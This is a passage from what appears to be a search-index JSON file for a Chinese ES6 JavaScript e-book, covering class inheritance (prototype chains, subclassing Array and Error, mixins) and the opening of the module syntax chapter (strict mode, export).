true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>ColorPoint</code>\u7ee7\u627f\u4e86<code>Point</code>\uff0c\u5bfc\u81f4\u524d\u8005\u539f\u578b\u7684\u539f\u578b\u662f\u540e\u8005\u7684\u539f\u578b\u3002</p> <p>\u56e0\u6b64\uff0c\u901a\u8fc7\u5b50\u7c7b\u5b9e\u4f8b\u7684<code>__proto__.__proto__</code>\u5c5e\u6027\uff0c\u53ef\u4ee5\u4fee\u6539\u7236\u7c7b\u5b9e\u4f8b\u7684\u884c\u4e3a\u3002</p> <pre><code>p2.__proto__.__proto__.printName = function () {\n  console.log('Ha');\n};\n\np1.printName() // \"Ha\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728<code>ColorPoint</code>\u7684\u5b9e\u4f8b<code>p2</code>\u4e0a\u5411<code>Point</code>\u7c7b\u6dfb\u52a0\u65b9\u6cd5\uff0c\u7ed3\u679c\u5f71\u54cd\u5230\u4e86<code>Point</code>\u7684\u5b9e\u4f8b<code>p1</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/#_2","title":"\u539f\u751f\u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f","text":"<p>\u539f\u751f\u6784\u9020\u51fd\u6570\u662f\u6307\u8bed\u8a00\u5185\u7f6e\u7684\u6784\u9020\u51fd\u6570\uff0c\u901a\u5e38\u7528\u6765\u751f\u6210\u6570\u636e\u7ed3\u6784\u3002ECMAScript \u7684\u539f\u751f\u6784\u9020\u51fd\u6570\u5927\u81f4\u6709\u4e0b\u9762\u8fd9\u4e9b\u3002</p> <ul> <li>Boolean()</li> <li>Number()</li> <li>String()</li> <li>Array()</li> <li>Date()</li> <li>Function()</li> <li>RegExp()</li> <li>Error()</li> <li>Object()</li> </ul> <p>\u4ee5\u524d\uff0c\u8fd9\u4e9b\u539f\u751f\u6784\u9020\u51fd\u6570\u662f\u65e0\u6cd5\u7ee7\u627f\u7684\uff0c\u6bd4\u5982\uff0c\u4e0d\u80fd\u81ea\u5df1\u5b9a\u4e49\u4e00\u4e2a<code>Array</code>\u7684\u5b50\u7c7b\u3002</p> <pre><code>function MyArray() {\n  Array.apply(this, arguments);\n}\n\nMyArray.prototype = Object.create(Array.prototype, {\n  constructor: {\n    value: MyArray,\n    writable: true,\n    configurable: true,\n    enumerable: true\n  }\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7ee7\u627f Array \u7684<code>MyArray</code>\u7c7b\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u7c7b\u7684\u884c\u4e3a\u4e0e<code>Array</code>\u5b8c\u5168\u4e0d\u4e00\u81f4\u3002</p> <pre><code>var colors = new MyArray();\ncolors[0] = \"red\";\ncolors.length  // 0\n\ncolors.length = 0;\ncolors[0]  // \"red\"\n</code></pre> <p>\u4e4b\u6240\u4ee5\u4f1a\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\uff0c\u662f\u56e0\u4e3a\u5b50\u7c7b\u65e0\u6cd5\u83b7\u5f97\u539f\u751f\u6784\u9020\u51fd\u6570\u7684\u5185\u90e8\u5c5e\u6027\uff0c\u901a\u8fc7<code>Array.apply()</code>\u6216\u8005\u5206\u914d\u7ed9\u539f\u578b\u5bf9\u8c61\u90fd\u4e0d\u884c\u3002\u539f\u751f\u6784\u9020\u51fd\u6570\u4f1a\u5ffd\u7565<code>apply</code>\u65b9\u6cd5\u4f20\u5165\u7684<code>this</code>\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u539f\u751f\u6784\u9020\u51fd\u6570\u7684<code>this</code>\u65e0\u6cd5\u7ed1\u5b9a\uff0c\u5bfc\u81f4\u62ff\u4e0d\u5230\u5185\u90e8\u5c5e\u6027\u3002</p> <p>ES5 \u662f\u5148\u65b0\u5efa\u5b50\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61<code>this</code>\uff0c\u518d\u5c06\u7236\u7c7b\u7684\u5c5e\u6027\u6dfb\u52a0\u5230\u5b50\u7c7b\u4e0a\uff0c\u7531\u4e8e\u7236\u7c7b\u7684\u5185\u90e8\u5c5e\u6027\u65e0\u6cd5\u83b7\u53d6\uff0c\u5bfc\u81f4\u65e0\u6cd5\u7ee7\u627f\u539f\u751f\u7684\u6784\u9020\u51fd\u6570\u3002\u6bd4\u5982\uff0c<code>Array</code>\u6784\u9020\u51fd\u6570\u6709\u4e00\u4e2a\u5185\u90e8\u5c5e\u6027<code>[[DefineOwnProperty]]</code>\uff0c\u7528\u6765\u5b9a\u4e49\u65b0\u5c5e\u6027\u65f6\uff0c\u66f4\u65b0<code>length</code>\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5185\u90e8\u5c5e\u6027\u65e0\u6cd5\u5728\u5b50\u7c7b\u83b7\u53d6\uff0c\u5bfc\u81f4\u5b50\u7c7b\u7684<code>length</code>\u5c5e\u6027\u884c\u4e3a\u4e0d\u6b63\u5e38\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u60f3\u8ba9\u4e00\u4e2a\u666e\u901a\u5bf9\u8c61\u7ee7\u627f<code>Error</code>\u5bf9\u8c61\u3002</p> <pre><code>var e = {};\n\nObject.getOwnPropertyNames(Error.call(e))\n// [ 'stack' ]\n\nObject.getOwnPropertyNames(e)\n// []\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u60f3\u901a\u8fc7<code>Error.call(e)</code>\u8fd9\u79cd\u5199\u6cd5\uff0c\u8ba9\u666e\u901a\u5bf9\u8c61<code>e</code>\u5177\u6709<code>Error</code>\u5bf9\u8c61\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002\u4f46\u662f\uff0c<code>Error.call()</code>\u5b8c\u5168\u5ffd\u7565\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u662f\u8fd4\u56de\u4e00\u4e2a\u65b0\u5bf9\u8c61\uff0c<code>e</code>\u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u53d8\u5316\u3002\u8fd9\u8bc1\u660e\u4e86<code>Error.call(e)</code>\u8fd9\u79cd\u5199\u6cd5\uff0c\u65e0\u6cd5\u7ee7\u627f\u539f\u751f\u6784\u9020\u51fd\u6570\u3002</p> <p>ES6 \u5141\u8bb8\u7ee7\u627f\u539f\u751f\u6784\u9020\u51fd\u6570\u5b9a\u4e49\u5b50\u7c7b\uff0c\u56e0\u4e3a ES6 \u662f\u5148\u65b0\u5efa\u7236\u7c7b\u7684\u5b9e\u4f8b\u5bf9\u8c61<code>this</code>\uff0c\u7136\u540e\u518d\u7528\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4fee\u9970<code>this</code>\uff0c\u4f7f\u5f97\u7236\u7c7b\u7684\u6240\u6709\u884c\u4e3a\u90fd\u53ef\u4ee5\u7ee7\u627f\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7ee7\u627f<code>Array</code>\u7684\u4f8b\u5b50\u3002</p> <pre><code>class MyArray extends Array {\n  constructor(...args) {\n    super(...args);\n  }\n}\n\nvar arr = new MyArray();\narr[0] = 12;\narr.length // 1\n\narr.length = 0;\narr[0] // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a<code>MyArray</code>\u7c7b\uff0c\u7ee7\u627f\u4e86<code>Array</code>\u6784\u9020\u51fd\u6570\uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u4ece<code>MyArray</code>\u751f\u6210\u6570\u7ec4\u7684\u5b9e\u4f8b\u3002\u8fd9\u610f\u5473\u7740\uff0cES6 \u53ef\u4ee5\u81ea\u5b9a\u4e49\u539f\u751f\u6570\u636e\u7ed3\u6784\uff08\u6bd4\u5982<code>Array</code>\u3001<code>String</code>\u7b49\uff09\u7684\u5b50\u7c7b\uff0c\u8fd9\u662f ES5 \u65e0\u6cd5\u505a\u5230\u7684\u3002</p> <p>\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4e5f\u8bf4\u660e\uff0c<code>extends</code>\u5173\u952e\u5b57\u4e0d\u4ec5\u53ef\u4ee5\u7528\u6765\u7ee7\u627f\u7c7b\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u7ee7\u627f\u539f\u751f\u7684\u6784\u9020\u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u5728\u539f\u751f\u6570\u636e\u7ed3\u6784\u7684\u57fa\u7840\u4e0a\uff0c\u5b9a\u4e49\u81ea\u5df1\u7684\u6570\u636e\u7ed3\u6784\u3002\u4e0b\u9762\u5c31\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5e26\u7248\u672c\u529f\u80fd\u7684\u6570\u7ec4\u3002</p> <pre><code>class VersionedArray extends Array {\n  constructor() {\n    super();\n    this.history = [[]];\n  }\n  commit() {\n    this.history.push(this.slice());\n  }\n  revert() {\n    this.splice(0, this.length, ...this.history[this.history.length - 1]);\n  }\n}\n\nvar x = new VersionedArray();\n\nx.push(1);\nx.push(2);\nx // [1, 2]\nx.history // [[]]\n\nx.commit();\nx.history // [[], [1, 2]]\n\nx.push(3);\nx // [1, 2, 3]\nx.history // [[], [1, 2]]\n\nx.revert();\nx // [1, 2]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>VersionedArray</code>\u4f1a\u901a\u8fc7<code>commit</code>\u65b9\u6cd5\uff0c\u5c06\u81ea\u5df1\u7684\u5f53\u524d\u72b6\u6001\u751f\u6210\u4e00\u4e2a\u7248\u672c\u5feb\u7167\uff0c\u5b58\u5165<code>history</code>\u5c5e\u6027\u3002<code>revert</code>\u65b9\u6cd5\u7528\u6765\u5c06\u6570\u7ec4\u91cd\u7f6e\u4e3a\u6700\u65b0\u4e00\u6b21\u4fdd\u5b58\u7684\u7248\u672c\u3002\u9664\u6b64\u4e4b\u5916\uff0c<code>VersionedArray</code>\u4f9d\u7136\u662f\u4e00\u4e2a\u666e\u901a\u6570\u7ec4\uff0c\u6240\u6709\u539f\u751f\u7684\u6570\u7ec4\u65b9\u6cd5\u90fd\u53ef\u4ee5\u5728\u5b83\u4e0a\u9762\u8c03\u7528\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49<code>Error</code>\u5b50\u7c7b\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u7528\u6765\u5b9a\u5236\u62a5\u9519\u65f6\u7684\u884c\u4e3a\u3002</p> <pre><code>class ExtendableError extends Error {\n  constructor(message) {\n    super();\n    this.message = message;\n    this.stack = (new Error()).stack;\n    this.name = this.constructor.name;\n  }\n}\n\nclass MyError extends ExtendableError {\n  constructor(m) {\n    super(m);\n  }\n}\n\nvar myerror = new MyError('ll');\nmyerror.message // \"ll\"\nmyerror instanceof Error // true\nmyerror.name // \"MyError\"\nmyerror.stack\n// Error\n//     at MyError.ExtendableError\n//     ...\n</code></pre> <p>\u6ce8\u610f\uff0c\u7ee7\u627f<code>Object</code>\u7684\u5b50\u7c7b\uff0c\u6709\u4e00\u4e2a\u884c\u4e3a\u5dee\u5f02\u3002</p> <pre><code>class NewObj extends Object{\n  constructor(){\n    super(...arguments);\n  }\n}\nvar o = new NewObj({attr: true});\no.attr === true  // false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>NewObj</code>\u7ee7\u627f\u4e86<code>Object</code>\uff0c\u4f46\u662f\u65e0\u6cd5\u901a\u8fc7<code>super</code>\u65b9\u6cd5\u5411\u7236\u7c7b<code>Object</code>\u4f20\u53c2\u3002\u8fd9\u662f\u56e0\u4e3a ES6 \u6539\u53d8\u4e86<code>Object</code>\u6784\u9020\u51fd\u6570\u7684\u884c\u4e3a\uff0c\u4e00\u65e6\u53d1\u73b0<code>Object</code>\u65b9\u6cd5\u4e0d\u662f\u901a\u8fc7<code>new Object()</code>\u8fd9\u79cd\u5f62\u5f0f\u8c03\u7528\uff0cES6 \u89c4\u5b9a<code>Object</code>\u6784\u9020\u51fd\u6570\u4f1a\u5ffd\u7565\u53c2\u6570\u3002</p>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/#mixin","title":"Mixin \u6a21\u5f0f\u7684\u5b9e\u73b0","text":"<p>Mixin \u6307\u7684\u662f\u591a\u4e2a\u5bf9\u8c61\u5408\u6210\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\uff0c\u65b0\u5bf9\u8c61\u5177\u6709\u5404\u4e2a\u7ec4\u6210\u6210\u5458\u7684\u63a5\u53e3\u3002\u5b83\u7684\u6700\u7b80\u5355\u5b9e\u73b0\u5982\u4e0b\u3002</p> <pre><code>const a = {\n  a: 'a'\n};\nconst b = {\n  b: 'b'\n};\nconst c = {...a, ...b}; // {a: 'a', b: 'b'}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>c</code>\u5bf9\u8c61\u662f<code>a</code>\u5bf9\u8c61\u548c<code>b</code>\u5bf9\u8c61\u7684\u5408\u6210\uff0c\u5177\u6709\u4e24\u8005\u7684\u63a5\u53e3\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u5b8c\u5907\u7684\u5b9e\u73b0\uff0c\u5c06\u591a\u4e2a\u7c7b\u7684\u63a5\u53e3\u201c\u6df7\u5165\u201d\uff08mix in\uff09\u53e6\u4e00\u4e2a\u7c7b\u3002</p> <pre><code>function mix(...mixins) {\n  class Mix {\n    constructor() {\n      for (let mixin of mixins) {\n        copyProperties(this, new mixin()); // \u62f7\u8d1d\u5b9e\u4f8b\u5c5e\u6027\n      }\n    }\n  }\n\n  for (let mixin of mixins) {\n    copyProperties(Mix, mixin); // \u62f7\u8d1d\u9759\u6001\u5c5e\u6027\n    copyProperties(Mix.prototype, mixin.prototype); // \u62f7\u8d1d\u539f\u578b\u5c5e\u6027\n  }\n\n  return Mix;\n}\n\nfunction copyProperties(target, source) {\n  for (let key of Reflect.ownKeys(source)) {\n    if ( key !== 'constructor'\n      &amp;&amp; key !== 'prototype'\n      &amp;&amp; key !== 'name'\n    ) {\n      let desc = Object.getOwnPropertyDescriptor(source, key);\n      Object.defineProperty(target, key, desc);\n    }\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>mix</code>\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u591a\u4e2a\u5bf9\u8c61\u5408\u6210\u4e3a\u4e00\u4e2a\u7c7b\u3002\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u53ea\u8981\u7ee7\u627f\u8fd9\u4e2a\u7c7b\u5373\u53ef\u3002</p> <pre><code>class DistributedEdit extends mix(Loggable, Serializable) {\n  // ...\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/","title":"Module \u7684\u8bed\u6cd5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 25589  \u9605\u8bfb52\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_1","title":"\u6982\u8ff0","text":"<p>\u5386\u53f2\u4e0a\uff0cJavaScript \u4e00\u76f4\u6ca1\u6709\u6a21\u5757\uff08module\uff09\u4f53\u7cfb\uff0c\u65e0\u6cd5\u5c06\u4e00\u4e2a\u5927\u7a0b\u5e8f\u62c6\u5206\u6210\u4e92\u76f8\u4f9d\u8d56\u7684\u5c0f\u6587\u4ef6\uff0c\u518d\u7528\u7b80\u5355\u7684\u65b9\u6cd5\u62fc\u88c5\u8d77\u6765\u3002\u5176\u4ed6\u8bed\u8a00\u90fd\u6709\u8fd9\u9879\u529f\u80fd\uff0c\u6bd4\u5982 Ruby \u7684<code>require</code>\u3001Python \u7684<code>import</code>\uff0c\u751a\u81f3\u5c31\u8fde CSS \u90fd\u6709<code>@import</code>\uff0c\u4f46\u662f JavaScript \u4efb\u4f55\u8fd9\u65b9\u9762\u7684\u652f\u6301\u90fd\u6ca1\u6709\uff0c\u8fd9\u5bf9\u5f00\u53d1\u5927\u578b\u7684\u3001\u590d\u6742\u7684\u9879\u76ee\u5f62\u6210\u4e86\u5de8\u5927\u969c\u788d\u3002</p> <p>\u5728 ES6 \u4e4b\u524d\uff0c\u793e\u533a\u5236\u5b9a\u4e86\u4e00\u4e9b\u6a21\u5757\u52a0\u8f7d\u65b9\u6848\uff0c\u6700\u4e3b\u8981\u7684\u6709 CommonJS \u548c AMD \u4e24\u79cd\u3002\u524d\u8005\u7528\u4e8e\u670d\u52a1\u5668\uff0c\u540e\u8005\u7528\u4e8e\u6d4f\u89c8\u5668\u3002ES6 \u5728\u8bed\u8a00\u6807\u51c6\u7684\u5c42\u9762\u4e0a\uff0c\u5b9e\u73b0\u4e86\u6a21\u5757\u529f\u80fd\uff0c\u800c\u4e14\u5b9e\u73b0\u5f97\u76f8\u5f53\u7b80\u5355\uff0c\u5b8c\u5168\u53ef\u4ee5\u53d6\u4ee3 CommonJS \u548c AMD \u89c4\u8303\uff0c\u6210\u4e3a\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u901a\u7528\u7684\u6a21\u5757\u89e3\u51b3\u65b9\u6848\u3002</p> <p>ES6 \u6a21\u5757\u7684\u8bbe\u8ba1\u601d\u60f3\u662f\u5c3d\u91cf\u7684==\u9759\u6001\u5316==\uff0c\u4f7f\u5f97==\u7f16\u8bd1\u65f6\u5c31\u80fd\u786e\u5b9a\u6a21\u5757\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u4ee5\u53ca\u8f93\u5165\u548c\u8f93\u51fa\u7684\u53d8\u91cf==\u3002CommonJS \u548c AMD \u6a21\u5757\uff0c\u90fd\u53ea\u80fd\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\u8fd9\u4e9b\u4e1c\u897f\u3002\u6bd4\u5982\uff0cCommonJS \u6a21\u5757\u5c31\u662f\u5bf9\u8c61\uff0c\u8f93\u5165\u65f6\u5fc5\u987b\u67e5\u627e\u5bf9\u8c61\u5c5e\u6027\u3002</p> <pre><code>let _fs = require('fs');\nlet stat = _fs.stat;\nlet exists = _fs.exists;\nlet readfile = _fs.readfile;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u5b9e\u8d28\u662f\u6574\u4f53\u52a0\u8f7d<code>fs</code>\u6a21\u5757\uff08\u5373\u52a0\u8f7d<code>fs</code>\u7684\u6240\u6709\u65b9\u6cd5\uff09\uff0c\u751f\u6210\u4e00\u4e2a\u5bf9\u8c61\uff08<code>_fs</code>\uff09\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u8bfb\u53d6 3 \u4e2a\u65b9\u6cd5\u3002\u8fd9\u79cd\u52a0\u8f7d\u79f0\u4e3a\u201c\u8fd0\u884c\u65f6\u52a0\u8f7d\u201d\uff0c\u56e0\u4e3a\u53ea\u6709\u8fd0\u884c\u65f6\u624d\u80fd\u5f97\u5230\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u5bfc\u81f4\u5b8c\u5168\u6ca1\u529e\u6cd5\u5728\u7f16\u8bd1\u65f6\u505a\u201c\u9759\u6001\u4f18\u5316\u201d\u3002</p> <p>ES6 \u6a21\u5757\u4e0d\u662f\u5bf9\u8c61\uff0c\u800c\u662f\u901a\u8fc7<code>export</code>\u547d\u4ee4\u663e\u5f0f\u6307\u5b9a\u8f93\u51fa\u7684\u4ee3\u7801\uff0c\u518d\u901a\u8fc7<code>import</code>\u547d\u4ee4\u8f93\u5165\u3002</p> <pre><code>// ES6\u6a21\u5757\nimport { stat, exists, readFile } from 'fs';\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u5b9e\u8d28\u662f\u4ece<code>fs</code>\u6a21\u5757\u52a0\u8f7d 3 \u4e2a\u65b9\u6cd5\uff0c\u5176\u4ed6\u65b9\u6cd5\u4e0d\u52a0\u8f7d\u3002\u8fd9\u79cd\u52a0\u8f7d\u79f0\u4e3a\u201c\u7f16\u8bd1\u65f6\u52a0\u8f7d\u201d\u6216\u8005\u9759\u6001\u52a0\u8f7d\uff0c\u5373 ES6 \u53ef\u4ee5==\u5728\u7f16\u8bd1\u65f6\u5c31\u5b8c\u6210\u6a21\u5757\u52a0\u8f7d==\uff0c\u6548\u7387\u8981\u6bd4 CommonJS \u6a21\u5757\u7684\u52a0\u8f7d\u65b9\u5f0f\u9ad8\u3002\u5f53\u7136\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u4e86\u6ca1\u6cd5\u5f15\u7528 ES6 \u6a21\u5757\u672c\u8eab\uff0c\u56e0\u4e3a\u5b83\u4e0d\u662f\u5bf9\u8c61\u3002</p> <p>\u7531\u4e8e ES6 \u6a21\u5757\u662f\u7f16\u8bd1\u65f6\u52a0\u8f7d\uff0c\u4f7f\u5f97\u9759\u6001\u5206\u6790\u6210\u4e3a\u53ef\u80fd\u3002\u6709\u4e86\u5b83\uff0c\u5c31\u80fd\u8fdb\u4e00\u6b65\u62d3\u5bbd JavaScript \u7684\u8bed\u6cd5\uff0c\u6bd4\u5982\u5f15\u5165\u5b8f\uff08macro\uff09\u548c\u7c7b\u578b\u68c0\u9a8c\uff08type system\uff09\u8fd9\u4e9b\u53ea\u80fd\u9760\u9759\u6001\u5206\u6790\u5b9e\u73b0\u7684\u529f\u80fd\u3002</p> <p>\u9664\u4e86\u9759\u6001\u52a0\u8f7d\u5e26\u6765\u7684\u5404\u79cd\u597d\u5904\uff0cES6 \u6a21\u5757\u8fd8\u6709\u4ee5\u4e0b\u597d\u5904\u3002</p> <ul> <li>\u4e0d\u518d\u9700\u8981<code>UMD</code>\u6a21\u5757\u683c\u5f0f\u4e86\uff0c\u5c06\u6765\u670d\u52a1\u5668\u548c\u6d4f\u89c8\u5668\u90fd\u4f1a\u652f\u6301 ES6 \u6a21\u5757\u683c\u5f0f\u3002\u76ee\u524d\uff0c\u901a\u8fc7\u5404\u79cd\u5de5\u5177\u5e93\uff0c\u5176\u5b9e\u5df2\u7ecf\u505a\u5230\u4e86\u8fd9\u4e00\u70b9\u3002</li> <li>\u5c06\u6765\u6d4f\u89c8\u5668\u7684\u65b0 API \u5c31\u80fd\u7528\u6a21\u5757\u683c\u5f0f\u63d0\u4f9b\uff0c\u4e0d\u518d\u5fc5\u987b\u505a\u6210\u5168\u5c40\u53d8\u91cf\u6216\u8005<code>navigator</code>\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</li> <li>\u4e0d\u518d\u9700\u8981\u5bf9\u8c61\u4f5c\u4e3a\u547d\u540d\u7a7a\u95f4\uff08\u6bd4\u5982<code>Math</code>\u5bf9\u8c61\uff09\uff0c\u672a\u6765\u8fd9\u4e9b\u529f\u80fd\u53ef\u4ee5\u901a\u8fc7\u6a21\u5757\u63d0\u4f9b\u3002</li> </ul> <p>\u672c\u7ae0\u4ecb\u7ecd ES6 \u6a21\u5757\u7684\u8bed\u6cd5</p>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_2","title":"\u4e25\u683c\u6a21\u5f0f","text":"<p>ES6 \u7684\u6a21\u5757==\u81ea\u52a8\u91c7\u7528\u4e25\u683c\u6a21\u5f0f==\uff0c\u4e0d\u7ba1\u4f60\u6709\u6ca1\u6709\u5728\u6a21\u5757\u5934\u90e8\u52a0\u4e0a<code>\"use strict\";</code>\u3002</p> <p>\u4e25\u683c\u6a21\u5f0f\u4e3b\u8981\u6709\u4ee5\u4e0b\u9650\u5236\u3002</p> <ul> <li>\u53d8\u91cf\u5fc5\u987b\u58f0\u660e\u540e\u518d\u4f7f\u7528</li> <li>\u51fd\u6570\u7684\u53c2\u6570\u4e0d\u80fd\u6709\u540c\u540d\u5c5e\u6027\uff0c\u5426\u5219\u62a5\u9519</li> <li>\u4e0d\u80fd\u4f7f\u7528<code>with</code>\u8bed\u53e5</li> <li>\u4e0d\u80fd\u5bf9\u53ea\u8bfb\u5c5e\u6027\u8d4b\u503c\uff0c\u5426\u5219\u62a5\u9519</li> <li>\u4e0d\u80fd\u4f7f\u7528\u524d\u7f00 0 \u8868\u793a\u516b\u8fdb\u5236\u6570\uff0c\u5426\u5219\u62a5\u9519</li> <li>\u4e0d\u80fd\u5220\u9664\u4e0d\u53ef\u5220\u9664\u7684\u5c5e\u6027\uff0c\u5426\u5219\u62a5\u9519</li> <li>\u4e0d\u80fd\u5220\u9664\u53d8\u91cf<code>delete prop</code>\uff0c\u4f1a\u62a5\u9519\uff0c\u53ea\u80fd\u5220\u9664\u5c5e\u6027<code>delete global[prop]</code></li> <li><code>eval</code>\u4e0d\u4f1a\u5728\u5b83\u7684\u5916\u5c42\u4f5c\u7528\u57df\u5f15\u5165\u53d8\u91cf</li> <li><code>eval</code>\u548c<code>arguments</code>\u4e0d\u80fd\u88ab\u91cd\u65b0\u8d4b\u503c</li> <li><code>arguments</code>\u4e0d\u4f1a\u81ea\u52a8\u53cd\u6620\u51fd\u6570\u53c2\u6570\u7684\u53d8\u5316</li> <li>\u4e0d\u80fd\u4f7f\u7528<code>arguments.callee</code></li> <li>\u4e0d\u80fd\u4f7f\u7528<code>arguments.caller</code></li> <li>\u7981\u6b62<code>this</code>\u6307\u5411\u5168\u5c40\u5bf9\u8c61</li> <li>\u4e0d\u80fd\u4f7f\u7528<code>fn.caller</code>\u548c<code>fn.arguments</code>\u83b7\u53d6\u51fd\u6570\u8c03\u7528\u7684\u5806\u6808</li> <li>\u589e\u52a0\u4e86\u4fdd\u7559\u5b57\uff08\u6bd4\u5982<code>protected</code>\u3001<code>static</code>\u548c<code>interface</code>\uff09</li> </ul> <p>\u4e0a\u9762\u8fd9\u4e9b\u9650\u5236\uff0c\u6a21\u5757\u90fd\u5fc5\u987b\u9075\u5b88\u3002\u5176\u4e2d\uff0c\u5c24\u5176\u9700\u8981\u6ce8\u610f<code>this</code>\u7684\u9650\u5236\u3002ES6 \u6a21\u5757\u4e4b\u4e2d\uff0c\u9876\u5c42\u7684<code>this</code>\u6307\u5411<code>undefined</code>\uff0c\u5373\u4e0d\u5e94\u8be5\u5728\u9876\u5c42\u4ee3\u7801\u4f7f\u7528<code>this</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#export","title":"export \u547d\u4ee4","text":"<p>\u6a21\u5757\u529f\u80fd\u4e3b\u8981\u7531\u4e24\u4e2a\u547d\u4ee4\u6784\u6210\uff1a<code>export</code>\u548c<code>import</code>\u3002<code>export</code>\u547d\u4ee4\u7528\u4e8e\u89c4\u5b9a\u6a21\u5757\u7684\u5bf9\u5916\u63a5\u53e3\uff0c<code>import</code>\u547d\u4ee4\u7528\u4e8e\u8f93\u5165\u5176\u4ed6\u6a21\u5757\u63d0\u4f9b\u7684\u529f\u80fd\u3002</p> <p>\u4e00\u4e2a\u6a21\u5757\u5c31\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u6587\u4ef6\u3002\u8be5\u6587\u4ef6\u5185\u90e8\u7684\u6240\u6709\u53d8\u91cf\uff0c\u5916\u90e8\u65e0\u6cd5\u83b7\u53d6\u3002\u5982\u679c\u4f60\u5e0c\u671b\u5916\u90e8\u80fd\u591f\u8bfb\u53d6\u6a21\u5757\u5185\u90e8\u7684\u67d0\u4e2a\u53d8\u91cf\uff0c\u5c31\u5fc5\u987b\u4f7f\u7528<code>export</code>\u5173\u952e\u5b57\u8f93\u51fa\u8be5\u53d8\u91cf\u3002\u4e0b\u9762\u662f\u4e00\u4e2a JS \u6587\u4ef6\uff0c\u91cc\u9762\u4f7f\u7528<code>export</code>\u547d\u4ee4\u8f93\u51fa\u53d8\u91cf\u3002</p> <pre><code>// profile.js\nexport var firstName = 'Michael';\nexport var lastName = 'An';\nexport var year = 1994;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u662f<code>profile.js</code>\u6587\u4ef6\uff0c\u4fdd\u5b58\u4e86\u7528\u6237\u4fe1\u606f\u3002ES6 \u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a\u6a21\u5757\uff0c\u91cc\u9762\u7528<code>export</code>\u547d\u4ee4\u5bf9\u5916\u90e8\u8f93\u51fa\u4e86\u4e09\u4e2a\u53d8\u91cf\u3002</p> <p><code>export</code>\u7684\u5199\u6cd5\uff0c\u9664\u4e86\u50cf\u4e0a\u9762\u8fd9\u6837\uff0c\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u3002</p> <pre><code>// profile.js\nvar firstName = 'Michael';\nvar lastName = 'Jackson';\nvar year = 1958;\n\nexport { firstName, lastName, year };\n</code></pre> 